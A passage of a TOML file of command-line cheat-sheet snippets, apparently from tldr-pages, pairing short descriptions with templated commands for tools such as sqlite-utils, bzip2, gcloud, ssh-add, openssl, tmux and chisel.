  command = "sqlite-utils rows <path/to/database.db> <table_name>"
  output = ""

[[snippets]]
  description = "Delete a record"
  command = "sqlite-utils query <path/to/database.db> ""<delete from table_name where name = 'Tony Hoare'>"""
  output = ""

[[snippets]]
  description = "Drop a table"
  command = "sqlite-utils drop-table <path/to/database.db> <table_name>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "sqlite-utils -h"
  output = ""

[[snippets]]
  description = "Recompress a file from `.Z` to `.gz` format"
  command = "znew <path/to/file1.Z>"
  output = ""

[[snippets]]
  description = "Recompress multiple files and display the achieved size reduction % per file"
  command = "znew -v <path/to/file1.Z path/to/file2.Z ...>"
  output = ""

[[snippets]]
  description = "Recompress a file using the slowest compression method (for optimal compression)"
  command = "znew -9 <path/to/file1.Z>"
  output = ""

[[snippets]]
  description = "Recompress a file, [K]eeping the `.Z` file if it is smaller than the `.gz` file"
  command = "znew -K <path/to/file1.Z>"
  output = ""

[[snippets]]
  description = "Copy files to the destination"
  command = "install <path/to/source_file1 path/to/source_file2 ...> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Copy files to the destination, setting their ownership"
  command = "install --owner <user> <path/to/source_file1 path/to/source_file2 ...> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Copy files to the destination, setting their group ownership"
  command = "install --group <user> <path/to/source_file1 path/to/source_file2 ...> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Copy files to the destination, setting their `mode`"
  command = "install --mode <+x> <path/to/source_file1 path/to/source_file2 ...> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Copy files and apply access/modification times of source to the destination"
  command = "install --preserve-timestamps <path/to/source_file1 path/to/source_file2 ...> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Copy files and create the directories at the destination if they don't exist"
  command = "install -D <path/to/source_file1 path/to/source_file2 ...> <path/to/destination>"
  output = ""

[[snippets]]
  description = "Convert a CoffeeScript file to JavaScript"
  command = "decaffeinate <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Convert a CoffeeScript v2 file to JavaScript"
  command = "decaffeinate --use-cs2 <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Convert require and `module.exports` to import and export"
  command = "decaffeinate --use-js-modules <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Convert a CoffeeScript, allowing named exports"
  command = "decaffeinate --loose-js-modules <path/to/file.coffee>"
  output = ""

[[snippets]]
  description = "Generate a `zip` file with information about the system configuration and the WARP connection"
  command = "warp-diag"
  output = ""

[[snippets]]
  description = "Generate a `zip` file with debug information including a timestamp to the output filename"
  command = "warp-diag --add-ts"
  output = ""

[[snippets]]
  description = "Save the output file under a specific directory"
  command = "warp-diag --output <path/to/directory>"
  output = ""

[[snippets]]
  description = "Submit a new feedback to Cloudflare's WARP interactively"
  command = "warp-diag feedback"
  output = ""

[[snippets]]
  description = "Scan file and output strings to `messages.po`"
  command = "xgettext <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Use a different output filename"
  command = "xgettext --output <path/to/output_file> <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Append new strings to an existing file"
  command = "xgettext --join-existing --output <path/to/output_file> <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Don't add a header containing metadata to the output file"
  command = "xgettext --omit-header <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Print a JPEG, PNG, or GIF to the terminal"
  command = "catimg <path/to/file>"
  output = ""

[[snippets]]
  description = "Double the [r]esolution of an image"
  command = "catimg -r 2 <path/to/file>"
  output = ""

[[snippets]]
  description = "Disable 24-bit color for better [t]erminal support"
  command = "catimg -t <path/to/file>"
  output = ""

[[snippets]]
  description = "Specify a custom [w]idth or [H]eight"
  command = "catimg <-w|-H> <40> <path/to/file>"
  output = ""

[[snippets]]
  description = "Create databases, load the schema, and initialize with seed data"
  command = "rails db:setup"
  output = ""

[[snippets]]
  description = "Access the database console"
  command = "rails db"
  output = ""

[[snippets]]
  description = "Create the databases defined in the current environment"
  command = "rails db:create"
  output = ""

[[snippets]]
  description = "Destroy the databases defined in the current environment"
  command = "rails db:drop"
  output = ""

[[snippets]]
  description = "Run pending migrations"
  command = "rails db:migrate"
  output = ""

[[snippets]]
  description = "View the status of each migration file"
  command = "rails db:migrate:status"
  output = ""

[[snippets]]
  description = "Rollback the last migration"
  command = "rails db:rollback"
  output = ""

[[snippets]]
  description = "Fill the current database with data defined in `db/seeds.rb`"
  command = "rails db:seed"
  output = ""

[[snippets]]
  description = "Compress a file"
  command = "zlib-flate -compress < <path/to/input_file> > <path/to/compressed.zlib>"
  output = ""

[[snippets]]
  description = "Uncompress a file"
  command = "zlib-flate -uncompress < <path/to/compressed.zlib> > <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Compress a file with a specified compression level. 0=Fastest (Worst), 9=Slowest (Best)"
  command = "zlib-flate -compress=<compression_level> < <path/to/input_file> > <path/to/compressed.zlib>"
  output = ""

[[snippets]]
  description = "Create specific directories"
  command = "mkdir <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Create specific directories and their [p]arents if needed"
  command = "mkdir -p <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Create directories with specific permissions"
  command = "mkdir -m <rwxrw-r--> <path/to/directory1 path/to/directory2 ...>"
  output = ""

[[snippets]]
  description = "Execute code style fixing"
  command = "pint"
  output = ""

[[snippets]]
  description = "Display all files that are changed"
  command = "pint -v"
  output = ""

[[snippets]]
  description = "Execute code style linting without applying changes"
  command = "pint --test"
  output = ""

[[snippets]]
  description = "Execute code style fixes using a specific configuration file"
  command = "pint --config <path/to/pint.json>"
  output = ""

[[snippets]]
  description = "Execute code style fixes using a specific preset"
  command = "pint --preset <psr12>"
  output = ""

[[snippets]]
  description = "Run a `doctl databases maintenance-window` command with an access token"
  command = "doctl databases maintenance-window <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve details about a database cluster's maintenance windows"
  command = "doctl databases maintenance-window get <database_id>"
  output = ""

[[snippets]]
  description = "Update the maintenance window for a database cluster"
  command = "doctl databases maintenance-window update <database_id> --day <day_of_the_week> --hour <hour_in_24_hours_format>"
  output = ""

[[snippets]]
  description = "Compress a file"
  command = "bzip2 <path/to/file_to_compress>"
  output = ""

[[snippets]]
  description = "[d]ecompress a file"
  command = "bzip2 -d <path/to/compressed_file.bz2>"
  output = ""

[[snippets]]
  description = "[d]ecompress a file to `stdout`"
  command = "bzip2 -dc <path/to/compressed_file.bz2>"
  output = ""

[[snippets]]
  description = "Test the integrity of each file inside the archive file"
  command = "bzip2 --test <path/to/compressed_file.bz2>"
  output = ""

[[snippets]]
  description = "Show the compression ratio for each file processed with detailed information"
  command = "bzip2 --verbose <path/to/compressed_files.bz2>"
  output = ""

[[snippets]]
  description = "Decompress a file overwriting existing files"
  command = "bzip2 --force <path/to/compressed_file.bz2>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "bzip2 -h"
  output = ""

[[snippets]]
  description = "List the last 10 issues with the `bug` label"
  command = "hub issue list --limit <10> --labels ""<bug>"""
  output = ""

[[snippets]]
  description = "Display a specific issue"
  command = "hub issue show <issue_number>"
  output = ""

[[snippets]]
  description = "List 10 closed issues assigneed to a specific user"
  command = "hub issue --state <closed> --assignee <username> --limit <10>"
  output = ""

[[snippets]]
  description = "Fork a GitHub repository by its slug"
  command = "hub fork <tldr-pages/tldr>"
  output = ""

[[snippets]]
  description = "Fork a GitHub repository by its URL"
  command = "hub fork <https://github.com/tldr-pages/tldr>"
  output = ""

[[snippets]]
  description = "Fork current GitHub repository, set remote name to origin"
  command = "hub fork --remote-name <origin>"
  output = ""

[[snippets]]
  description = "Deploy an app's code and configuration to the App Engine server"
  command = "gcloud app deploy <deployables>"
  output = ""

[[snippets]]
  description = "List all versions of all services deployed to the App Engine server"
  command = "gcloud app versions list"
  output = ""

[[snippets]]
  description = "Open the current app in a web browser"
  command = "gcloud app browse"
  output = ""

[[snippets]]
  description = "Create an App Engine app within the current project"
  command = "gcloud app create"
  output = ""

[[snippets]]
  description = "Display the latest App Engine app logs"
  command = "gcloud app logs read"
  output = ""

[[snippets]]
  description = "Add a component to a toolchain"
  command = "rustup component add --toolchain <toolchain> <component>"
  output = ""

[[snippets]]
  description = "Remove a component from a toolchain"
  command = "rustup component remove --toolchain <toolchain> <component>"
  output = ""

[[snippets]]
  description = "List installed and available components for a toolchain"
  command = "rustup component list --toolchain <toolchain>"
  output = ""

[[snippets]]
  description = "List installed components for a toolchain"
  command = "rustup component list --toolchain <toolchain> --installed"
  output = ""

[[snippets]]
  description = "Deploy a dockerized application to Kubernetes"
  command = "kompose up -f <docker-compose.yml>"
  output = ""

[[snippets]]
  description = "Delete instantiated services/deployments from Kubernetes"
  command = "kompose down -f <docker-compose.yml>"
  output = ""

[[snippets]]
  description = "Convert a docker-compose file into Kubernetes resources file"
  command = "kompose convert -f <docker-compose.yml>"
  output = ""

[[snippets]]
  description = "Turn on Gammastep with a specific [t]emperature during the day (e.g. 5700k) and at night (e.g. 3600k)"
  command = "gammastep -t <5700>:<3600>"
  output = ""

[[snippets]]
  description = "Turn on Gammastep with a manually specified custom [l]ocation"
  command = "gammastep -l <latitude>:<longitude>"
  output = ""

[[snippets]]
  description = "Turn on Gammastep with a specific screen [b]rightness during the day (e.g. 70%) and at night (e.g. 40%), with minimum brightness 10% and maximum brightness 100%"
  command = "gammastep -b <0.7>:<0.4>"
  output = ""

[[snippets]]
  description = "Turn on Gammastep with custom [g]amma levels (between 0 and 1)"
  command = "gammastep -g <red>:<green>:<blue>"
  output = ""

[[snippets]]
  description = "Turn on Gammastep with a c[O]nstant unchanging color temperature"
  command = "gammastep -O <temperature>"
  output = ""

[[snippets]]
  description = "Reset temperature adjustments applied by Gammastep"
  command = "gammastep -x"
  output = ""

[[snippets]]
  description = "Add the default ssh keys in `~/.ssh` to the ssh-agent"
  command = "ssh-add"
  output = ""

[[snippets]]
  description = "Add a specific key to the ssh-agent"
  command = "ssh-add <path/to/private_key>"
  output = ""

[[snippets]]
  description = "List fingerprints of currently loaded keys"
  command = "ssh-add -l"
  output = ""

[[snippets]]
  description = "Delete a key from the ssh-agent"
  command = "ssh-add -d <path/to/private_key>"
  output = ""

[[snippets]]
  description = "Delete all currently loaded keys from the ssh-agent"
  command = "ssh-add -D"
  output = ""

[[snippets]]
  description = "Add a key to the ssh-agent and the keychain"
  command = "ssh-add -K <path/to/private_key>"
  output = ""

[[snippets]]
  description = "Start Minetest in client mode"
  command = "minetest"
  output = ""

[[snippets]]
  description = "Start Minetest in server mode by hosting a specific world"
  command = "minetest --server --world <name>"
  output = ""

[[snippets]]
  description = "Write logs to a specific file"
  command = "minetest --logfile <path/to/file>"
  output = ""

[[snippets]]
  description = "Only write errors to the console"
  command = "minetest --quiet"
  output = ""

[[snippets]]
  description = "Convert a Netpbm image to the QOI format"
  command = "pamtoqoi <path/to/image.pnm> > <path/to/output.qoi>"
  output = ""

[[snippets]]
  description = "Download a pre-built Truffle project (Truffle Box)"
  command = "truffle unbox <box_name>"
  output = ""

[[snippets]]
  description = "Compile contract source files in the current directory"
  command = "truffle compile"
  output = ""

[[snippets]]
  description = "Run JavaScript and Solidity tests"
  command = "truffle test"
  output = ""

[[snippets]]
  description = "Run migrations to deploy contracts"
  command = "truffle migrate"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "truffle help <subcommand>"
  output = ""

[[snippets]]
  description = "Open the npm page of a specific package in the web browser"
  command = "npm-home <package>"
  output = ""

[[snippets]]
  description = "Open the GitHub repository of a specific package in the web browser"
  command = "npm-home -g <package>"
  output = ""

[[snippets]]
  description = "Open the Yarn page of a specific package in the web browser"
  command = "npm-home -y <package>"
  output = ""

[[snippets]]
  description = "Calculate the SHA256 digest for a file, saving the result to a specific file"
  command = "openssl dgst -sha256 -binary -out <output_file> <input_file>"
  output = ""

[[snippets]]
  description = "Sign a file using an RSA key, saving the result to a specific file"
  command = "openssl dgst -sign <private_key_file> -sha256 -sigopt rsa_padding_mode:pss -out <output_file> <input_file>"
  output = ""

[[snippets]]
  description = "Verify an RSA signature"
  command = "openssl dgst -verify <public_key_file> -signature <signature_file> -sigopt rsa_padding_mode:pss <signature_message_file>"
  output = ""

[[snippets]]
  description = "Sign a file using and ECDSA key"
  command = "openssl dgst -sign <private_key_file> -sha256 -out <output_file> <input_file>"
  output = ""

[[snippets]]
  description = "Verify an ECDSA signature"
  command = "openssl dgst -verify <public_key_file> -signature <signature_file> <signature_message_file>"
  output = ""

[[snippets]]
  description = "Print the contents of one or more files to `stdout`"
  command = "bat <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Concatenate several files into the target file"
  command = "bat <path/to/file1 path/to/file2 ...> > <path/to/target_file>"
  output = ""

[[snippets]]
  description = "Append several files into the target file"
  command = "bat <path/to/file1 path/to/file2 ...> >> <path/to/target_file>"
  output = ""

[[snippets]]
  description = "Number all output lines"
  command = "bat --number <path/to/file>"
  output = ""

[[snippets]]
  description = "Syntax highlight a JSON file"
  command = "bat --language json <path/to/file.json>"
  output = ""

[[snippets]]
  description = "Display all supported languages"
  command = "bat --list-languages"
  output = ""

[[snippets]]
  description = "[r]ead the flash ROM of a AVR microcontroller with a specific [p]art id"
  command = "avrdude -p <part_no> -c <programmer_id> -U flash:r:<file.hex>:i"
  output = ""

[[snippets]]
  description = "[w]rite to the flash ROM AVR microcontroller"
  command = "avrdude -p <part_no> -c <programmer> -U flash:w:<file.hex>"
  output = ""

[[snippets]]
  description = "List available AVR devices"
  command = "avrdude -p \?"
  output = ""

[[snippets]]
  description = "List available AVR programmers"
  command = "avrdude -c \?"
  output = ""

[[snippets]]
  description = "Start `diskonaut` in the current directory"
  command = "diskonaut"
  output = ""

[[snippets]]
  description = "Start `diskonaut` in a specific directory"
  command = "diskonaut <path/to/directory>"
  output = ""

[[snippets]]
  description = "Show file sizes rather than their block usage on the disk"
  command = "diskonaut --apparent-size <path/to/directory>"
  output = ""

[[snippets]]
  description = "Disable deletion confirmation"
  command = "diskonaut --disable-delete-confirmation"
  output = ""

[[snippets]]
  description = "Format a file and display the result to the console"
  command = "gofmt <source.go>"
  output = ""

[[snippets]]
  description = "Format a file, overwriting the original file in-place"
  command = "gofmt -w <source.go>"
  output = ""

[[snippets]]
  description = "Format a file, and then simplify the code, overwriting the original file"
  command = "gofmt -s -w <source.go>"
  output = ""

[[snippets]]
  description = "Print all (including spurious) errors"
  command = "gofmt -e <source.go>"
  output = ""

[[snippets]]
  description = "List all local and global configuration options and their values"
  command = "dolt config --list"
  output = ""

[[snippets]]
  description = "Display the value of a local or global configuration variable"
  command = "dolt config --get <name>"
  output = ""

[[snippets]]
  description = "Modify the value of a local configuration variable, creating it if it doesn't exist"
  command = "dolt config --add <name> <value>"
  output = ""

[[snippets]]
  description = "Modify the value of a global configuration variable, creating it if it doesn't exist"
  command = "dolt config --global --add <name> <value>"
  output = ""

[[snippets]]
  description = "Delete a local configuration variable"
  command = "dolt config --unset <name>"
  output = ""

[[snippets]]
  description = "Delete a global configuration variable"
  command = "dolt config --global --unset <name>"
  output = ""

[[snippets]]
  description = "Generate Python code from a `.proto` file"
  command = "protoc --python_out=<path/to/output_directory> <input_file.proto>"
  output = ""

[[snippets]]
  description = "Generate Java code from a `.proto` file that imports other `.proto` files"
  command = "protoc --java_out=<path/to/output_directory> --proto_path=<path/to/import_search_path> <input_file.proto>"
  output = ""

[[snippets]]
  description = "Generate code for multiple languages"
  command = "protoc --csharp_out=<path/to/c#_output_directory> --js_out=<path/to/js_output_directory> <input_file.proto>"
  output = ""

[[snippets]]
  description = "Run default checks on a source file"
  command = "clang-tidy <path/to/file.cpp>"
  output = ""

[[snippets]]
  description = "Don't run any checks other than the `cppcoreguidelines` checks on a file"
  command = "clang-tidy <path/to/file.cpp> -checks=<-*,cppcoreguidelines-*>"
  output = ""

[[snippets]]
  description = "List all available checks"
  command = "clang-tidy -checks=<*> -list-checks"
  output = ""

[[snippets]]
  description = "Specify defines and includes as compilation options (after `--`)"
  command = "clang-tidy <path/to/file.cpp> -- -I<my_project/include> -D<definitions>"
  output = ""

[[snippets]]
  description = "Display a calendar for the current month"
  command = "jcal"
  output = ""

[[snippets]]
  description = "Display the previous, current, and next months"
  command = "jcal -3"
  output = ""

[[snippets]]
  description = "Display a calendar for a specific year (4 digits)"
  command = "jcal <year>"
  output = ""

[[snippets]]
  description = "Display a calendar for a specific month and year"
  command = "jcal <year> <month>"
  output = ""

[[snippets]]
  description = "Start SpeedCrunch"
  command = "speedcrunch"
  output = ""

[[snippets]]
  description = "Copy the result of the most recent calculation"
  command = "<Ctrl> + R"
  output = ""

[[snippets]]
  description = "Open the formula book"
  command = "<Ctrl> + 1"
  output = ""

[[snippets]]
  description = "Clear the calculator of recent calculations"
  command = "<Ctrl> + N"
  output = ""

[[snippets]]
  description = "Wrap highlighted in parentheses (defaults to wrapping all if nothing selected)"
  command = "<Ctrl> + P"
  output = ""

[[snippets]]
  description = "Load a speedcrunch session"
  command = "<Ctrl> + L"
  output = ""

[[snippets]]
  description = "Save a speedcrunch session"
  command = "<Ctrl> + S"
  output = ""

[[snippets]]
  description = "Toggle keypad"
  command = "<Ctrl> + K"
  output = ""

[[snippets]]
  description = "Print kernel name"
  command = "uname"
  output = ""

[[snippets]]
  description = "Print system architecture and processor information"
  command = "uname --machine --processor"
  output = ""

[[snippets]]
  description = "Print kernel name, kernel release and kernel version"
  command = "uname --kernel-name --kernel-release --kernel-version"
  output = ""

[[snippets]]
  description = "Print system hostname"
  command = "uname --nodename"
  output = ""

[[snippets]]
  description = "Print all available system information"
  command = "uname --all"
  output = ""

[[snippets]]
  description = "Mimic the default output of `cmatrix` (no unicode, works in a TTY)"
  command = "unimatrix --no-bold --speed <96> --character-list <o>"
  output = ""

[[snippets]]
  description = "No bold characters, slowly, with emojis, numbers, and a few symbols"
  command = "unimatrix --no-bold --speed <50> --character-list <ens>"
  output = ""

[[snippets]]
  description = "Change the color of characters"
  command = "unimatrix --color <red|green|blue|white|...>"
  output = ""

[[snippets]]
  description = "Select character set(s) using letter codes (see `unimatrix --help` for available character sets)"
  command = "unimatrix --character-list <character_sets>"
  output = ""

[[snippets]]
  description = "Change the scrolling speed"
  command = "unimatrix --speed <number>"
  output = ""

[[snippets]]
  description = "Run a Chisel server"
  command = "chisel server"
  output = ""

[[snippets]]
  description = "Run a Chisel server listening to a specific port"
  command = "chisel server -p <server_port>"
  output = ""

[[snippets]]
  description = "Run a chisel server that accepts authenticated connections using username and password"
  command = "chisel server --auth <username>:<password>"
  output = ""

[[snippets]]
  description = "Connect to a Chisel server and tunnel a specific port to a remote server and port"
  command = "chisel client <server_ip>:<server_port> <local_port>:<remote_server>:<remote_port>"
  output = ""

[[snippets]]
  description = "Connect to a Chisel server and tunnel a specific host and port to a remote server and port"
  command = "chisel client <server_ip>:<server_port> <local_host>:<local_port>:<remote_server>:<remote_port>"
  output = ""

[[snippets]]
  description = "Connect to a Chisel server using username and password authentication"
  command = "chisel client --auth <username>:<password> <server_ip>:<server_port> <local_port>:<remote_server>:<remote_port>"
  output = ""

[[snippets]]
  description = "Rename the branch you are currently on"
  command = "git rename-branch <new_branch_name>"
  output = ""

[[snippets]]
  description = "Rename a specific branch"
  command = "git rename-branch <old_branch_name> <new_branch_name>"
  output = ""

[[snippets]]
  description = "Open the first search result in the default PDF viewer"
  command = "texdoc <search>"
  output = ""

[[snippets]]
  description = "List the best search results"
  command = "texdoc --list <search>"
  output = ""

[[snippets]]
  description = "Open full documentation of texdoc"
  command = "texdoc <texdoc>"
  output = ""

[[snippets]]
  description = "Run a command with a file lock as soon as the lock is not required by others"
  command = "flock <path/to/lock.lock> --command ""<command>"""
  output = ""

[[snippets]]
  description = "Run a command with a file lock, and exit if the lock doesn't exist"
  command = "flock <path/to/lock.lock> --nonblock --command ""<command>"""
  output = ""

[[snippets]]
  description = "Run a command with a file lock, and exit with a specific error code if the lock doesn't exist"
  command = "flock <path/to/lock.lock> --nonblock --conflict-exit-code <error_code> -c ""<command>"""
  output = ""

[[snippets]]
  description = "Convert an XLS file to CSV"
  command = "in2csv <data.xls>"
  output = ""

[[snippets]]
  description = "Convert a DBF file to a CSV file"
  command = "in2csv <data.dbf> > <data.csv>"
  output = ""

[[snippets]]
  description = "Convert a specific sheet from an XLSX file to CSV"
  command = "in2csv --sheet=<sheet_name> <data.xlsx>"
  output = ""

[[snippets]]
  description = "Pipe a JSON file to in2csv"
  command = "cat <data.json> | in2csv -f json > <data.csv>"
  output = ""

[[snippets]]
  description = "Execute the command from a local or remote `npm` package"
  command = "npx <command> <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "In case multiple commands with the same name exist, it is possible to explicitly specify the package"
  command = "npx --package <package> <command>"
  output = ""

[[snippets]]
  description = "Run a command if it exists in the current path or in `node_modules/.bin`"
  command = "npx --no-install <command> <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Execute a specific command suppressing any output from `npx` itself"
  command = "npx --quiet <command> <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "npx --help"
  output = ""

[[snippets]]
  description = "List all components"
  command = "gpgconf --list-components"
  output = ""

[[snippets]]
  description = "List the directories used by gpgconf"
  command = "gpgconf --list-dirs"
  output = ""

[[snippets]]
  description = "List all options of a component"
  command = "gpgconf --list-options <component>"
  output = ""

[[snippets]]
  description = "List programs and test whether they are runnable"
  command = "gpgconf --check-programs"
  output = ""

[[snippets]]
  description = "Reload a component"
  command = "gpgconf --reload <component>"
  output = ""

[[snippets]]
  description = "Merge a repository's branch into the current repository's directory"
  command = "git merge-repo <path/to/repo> <branch_name> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Merge a remote repository's branch into the current repository's directory, not preserving history"
  command = "git merge-repo <path/to/remote_repo> <branch_name> ."
  output = ""

[[snippets]]
  description = "Run a development server"
  command = "flask run"
  output = ""

[[snippets]]
  description = "Show the routes for the app"
  command = "flask routes"
  output = ""

[[snippets]]
  description = "Run a Python interactive shell in the app's context"
  command = "flask shell"
  output = ""

[[snippets]]
  description = "Build a specific app"
  command = "fdroid build <app_id>"
  output = ""

[[snippets]]
  description = "Build a specific app in a build server VM"
  command = "fdroid build <app_id> --server"
  output = ""

[[snippets]]
  description = "Publish the app to the local repository"
  command = "fdroid publish <app_id>"
  output = ""

[[snippets]]
  description = "Install the app on every connected device"
  command = "fdroid install <app_id>"
  output = ""

[[snippets]]
  description = "Check if the metadata is formatted correctly"
  command = "fdroid lint --format <app_id>"
  output = ""

[[snippets]]
  description = "Fix the formatting automatically (if possible)"
  command = "fdroid rewritemeta <app_id>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "sbcl"
  output = ""

[[snippets]]
  description = "Execute a Lisp script"
  command = "sbcl --script <path/to/script.lisp>"
  output = ""

[[snippets]]
  description = "Fix issues in the specified directory (defaults to the PEAR standard)"
  command = "phpcbf <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display a list of installed coding standards"
  command = "phpcbf -i"
  output = ""

[[snippets]]
  description = "Specify a coding standard to validate against"
  command = "phpcbf <path/to/directory> --standard <standard>"
  output = ""

[[snippets]]
  description = "Specify comma-separated file extensions to include when sniffing"
  command = "phpcbf <path/to/directory> --extensions <file_extension1,file_extension2,...>"
  output = ""

[[snippets]]
  description = "A comma-separated list of files to load before processing"
  command = "phpcbf <path/to/directory> --bootstrap <path/to/file1,path/to/file2,...)>"
  output = ""

[[snippets]]
  description = "Don't recurse into subdirectories"
  command = "phpcbf <path/to/directory> -l"
  output = ""

[[snippets]]
  description = "Declare a string variable with the specified value"
  command = "typeset <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare an integer variable with the specified value"
  command = "typeset -i <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare an array variable with the specified value"
  command = "typeset <variable>=(<item_a item_b item_c>)"
  output = ""

[[snippets]]
  description = "Declare an associative array variable with the specified value"
  command = "typeset -A <variable>=(<[key_a]=item_a [key_b]=item_b [key_c]=item_c>)"
  output = ""

[[snippets]]
  description = "Declare a readonly variable with the specified value"
  command = "typeset -r <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "Declare a global variable within a function with the specified value"
  command = "typeset -g <variable>=""<value>"""
  output = ""

[[snippets]]
  description = "List Compute Engine zones"
  command = "gcloud compute zones list"
  output = ""

[[snippets]]
  description = "Create a VM instance"
  command = "gcloud compute instances create <instance_name>"
  output = ""

[[snippets]]
  description = "Display a VM instance's details"
  command = "gcloud compute instances describe <instance_name>"
  output = ""

[[snippets]]
  description = "List all VM instances in a project"
  command = "gcloud compute instances list"
  output = ""

[[snippets]]
  description = "Create a snapshot of a persistent disk"
  command = "gcloud compute disks snapshot <disk_name> --snapshot-names <snapshot_name>"
  output = ""

[[snippets]]
  description = "Display a snapshot's details"
  command = "gcloud compute snapshots describe <snapshot_name>"
  output = ""

[[snippets]]
  description = "Delete a snapshot"
  command = "gcloud compute snapshots delete <snapshot_name>"
  output = ""

[[snippets]]
  description = "Connect to a VM instance using SSH"
  command = "gcloud compute ssh <instance_name>"
  output = ""

[[snippets]]
  description = "Update `ibmcloud` to the latest version"
  command = "ibmcloud update"
  output = ""

[[snippets]]
  description = "Install the Cloud Foundry module for accessing Cloud Foundry services"
  command = "ibmcloud cf install"
  output = ""

[[snippets]]
  description = "List all available IBM Cloud regions"
  command = "ibmcloud regions"
  output = ""

[[snippets]]
  description = "Display help"
  command = "ibmcloud help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "ibmcloud help <subcommand>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ibmcloud version"
  output = ""

[[snippets]]
  description = "Install Husky in the current directory"
  command = "husky install"
  output = ""

[[snippets]]
  description = "Install Husky into a specific directory"
  command = "husky install <path/to/directory>"
  output = ""

[[snippets]]
  description = "Set a specific command as a `pre-push` hook for Git"
  command = "husky set <.husky/pre-push> ""<command> <command_arguments>"""
  output = ""

[[snippets]]
  description = "Add a specific command to the current `pre-commit` hook"
  command = "husky add <.husky/pre-commit> ""<command> <command_arguments>"""
  output = ""

[[snippets]]
  description = "Uninstall Husky hooks from the current directory"
  command = "husky uninstall"
  output = ""

[[snippets]]
  description = "Display help"
  command = "husky"
  output = ""

[[snippets]]
  description = "Produce an image containing thumbnails of the specified images in a grid"
  command = "pnmindex <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the size of the (quadratic) thumbnails"
  command = "pnmindex -size <50> <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the number of thumbnails per row"
  command = "pnmindex -across <10> <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the maximum number of colors in the output"
  command = "pnmindex -colors <512> <path/to/input1.pnm path/to/input2.pnm ...> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Install a package and its dependencies"
  command = "sudo tlmgr install <package>"
  output = ""

[[snippets]]
  description = "Reinstall a package"
  command = "sudo tlmgr install --reinstall <package>"
  output = ""

[[snippets]]
  description = "Simulate installing a package without making any changes"
  command = "tlmgr install --dry-run <package>"
  output = ""

[[snippets]]
  description = "Install a package without its dependencies"
  command = "sudo tlmgr install --no-depends <package>"
  output = ""

[[snippets]]
  description = "Install a package from a specific file"
  command = "sudo tlmgr install --file <path/to/package>"
  output = ""

[[snippets]]
  description = "Run a recipe specified in the justfile"
  command = "just <recipe>"
  output = ""

[[snippets]]
  description = "Initialize new justfile in project root"
  command = "just --init"
  output = ""

[[snippets]]
  description = "Edit justfile in the default editor"
  command = "just -e"
  output = ""

[[snippets]]
  description = "List available recipes in the justfile"
  command = "just -l"
  output = ""

[[snippets]]
  description = "Print justfile"
  command = "just --dump"
  output = ""

[[snippets]]
  description = "Show a short summary of a specific topic on Wikipedia"
  command = "wikit <topic>"
  output = ""

[[snippets]]
  description = "Specify a [l]anguage (ISO 639-1 language code)"
  command = "wikit <topic> --lang <language_code>"
  output = ""

[[snippets]]
  description = "Open the full Wikipedia article in the default browser"
  command = "wikit <topic> -b"
  output = ""

[[snippets]]
  description = "Open a disambiguation menu"
  command = "wikit <topic> -d"
  output = ""

[[snippets]]
  description = "Start a new session"
  command = "tmux"
  output = ""

[[snippets]]
  description = "Start a new named session"
  command = "tmux new -s <name>"
  output = ""

[[snippets]]
  description = "List existing sessions"
  command = "tmux ls"
  output = ""

[[snippets]]
  description = "Attach to the most recently used session"
  command = "tmux attach"
  output = ""

[[snippets]]
  description = "Detach from the current session (inside a tmux session)"
  command = "<Ctrl>-B d"
  output = ""

[[snippets]]
  description = "Create a new window (inside a tmux session)"
  command = "<Ctrl>-B c"
  output = ""

[[snippets]]
  description = "Switch between sessions and windows (inside a tmux session)"
  command = "<Ctrl>-B w"
  output = ""

[[snippets]]
  description = "Kill a session by name"
  command = "tmux kill-session -t <name>"
  output = ""

[[snippets]]
  description = "Turn on Redshift with a specific [t]emperature during day (e.g., 5700K) and at night (e.g., 3600K)"
  command = "redshift -t <5700>:<3600>"
  output = ""

[[snippets]]
  description = "Turn on Redshift with a manually specified custom [l]ocation"
  command = "redshift -l <latitude>:<longitude>"
  output = ""

[[snippets]]
  description = "Turn on Redshift with a specific screen [b]rightness during the day (e.g, 70%) and at night (e.g., 40%)"
  command = "redshift -b <0.7>:<0.4>"
  output = ""

[[snippets]]
  description = "Turn on Redshift with custom [g]amma levels (between 0 and 1)"
  command = "redshift -g <red>:<green>:<blue>"
  output = ""

[[snippets]]
  description = "Turn on Redshift with a constant unchanging color temperature"
  command = "redshift -O <temperature>"
  output = ""

[[snippets]]
